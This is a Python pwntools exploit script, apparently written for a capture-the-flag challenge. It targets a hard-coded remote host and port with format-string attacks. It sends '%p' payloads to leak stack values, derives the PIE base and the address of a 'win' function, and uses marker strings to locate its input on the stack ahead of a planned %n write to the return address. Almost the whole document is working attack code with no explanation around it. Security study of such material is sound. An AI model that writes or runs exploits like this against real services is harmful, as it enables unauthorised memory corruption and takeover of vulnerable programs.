#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
context.log_level = 'warning'

HOST = '52.59.124.14'
PORT = 5030

WIN_OFFSET = 0xdbed0
GREETING_OFFSET = 0xdc060

def leak_stack():
    io = remote(HOST, PORT, timeout=10)
    io.recvuntil(b'Name:\n', timeout=5)

    # Leak key positions to understand the layout
    payload = b'%6$p|%7$p|%8$p|%77$p|%78$p|%79$p'
    io.sendline(payload)

    io.recvuntil(b'market:\n', timeout=5)
    leak = io.recvline(timeout=5).decode().strip()
    print(f'Leaks: {leak}')

    parts = leak.split('|')
    for i, p in enumerate(parts):
        print(f'  Part {i}: {p}')

    if len(parts) >= 6:
        greeting = int(parts[2], 16) if parts[2] != '(nil)' else 0
        stack77 = int(parts[3], 16) if parts[3] != '(nil)' else 0
        stack78 = int(parts[4], 16) if parts[4] != '(nil)' else 0
        ret_val = int(parts[5], 16) if parts[5] != '(nil)' else 0

        if greeting:
            pie_base = greeting - GREETING_OFFSET
            win = pie_base + WIN_OFFSET
            expected_ret = pie_base + 0xdc052

            print(f'PIE base: {hex(pie_base)}')
            print(f'Win func: {hex(win)}')
            print(f'Expected return addr: {hex(expected_ret)}')
            print(f'Actual pos79 value: {hex(ret_val)}')
            print(f'Match: {ret_val == expected_ret}')

            if stack77 and stack78:
                print(f'Stack77 value: {hex(stack77)}')
                print(f'Stack78 value: {hex(stack78)}')
                print(f'Diff (77-78): {hex(stack77 - stack78)}')

    io.close()

def try_fmtstr_write():
    """
    Use format string %n to write to the return address.

    The trick: we need to put the target address in our input,
    and use %n to write to it.

    Our input starts at position 10 (since positions 1-9 are other stack data).
    Let's verify this and find the exact position.
    """
    io = remote(HOST, PORT, timeout=10)
    io.recvuntil(b'Name:\n', timeout=5)

    # First, find where our input appears on the stack
    # Use a marker pattern
    payload = b'AAAABBBB%10$p|%11$p|%12$p'
    io.sendline(payload)

    io.recvuntil(b'market:\n', timeout=5)
    output = io.recvline(timeout=5).decode().strip()
    print(f'With AAAABBBB prefix: {output}')

    # AAAABBBB = 0x4242424241414141 in little endian
    io.close()

def find_input_position():
    """Find which format string position contains our input."""
    io = remote(HOST, PORT, timeout=10)
    io.recvuntil(b'Name:\n', timeout=5)

    # Try leaking positions 10-15 to see where our input lands
    payload = b'%10$p.%11$p.%12$p.%13$p.%14$p.%15$p'
    io.sendline(payload)

    io.recvuntil(b'market:\n', timeout=5)
    output = io.recvline(timeout=5).decode().strip()
    print(f'Positions 10-15: {output}')
    io.close()

    io = remote(HOST, PORT, timeout=10)
    io.recvuntil(b'Name:\n', timeout=5)

    # Now with padding to align address
    payload = b'AAAAAAAA%10$p.%11$p.%12$p'
    io.sendline(payload)

    io.recvuntil(b'market:\n', timeout=5)
    output = io.recvline(timeout=5).decode().strip()
    print(f'With AAAAAAAA (8 bytes): {output}')
    # If 0x4141414141414141 appears at position N, we know our input is there
    io.close()

if __name__ == '__main__':
    print("=== Leak stack positions ===")
    leak_stack()

    print("\n=== Find input position ===")
    find_input_position()

    print("\n=== Test format string write ===")
    try_fmtstr_write()
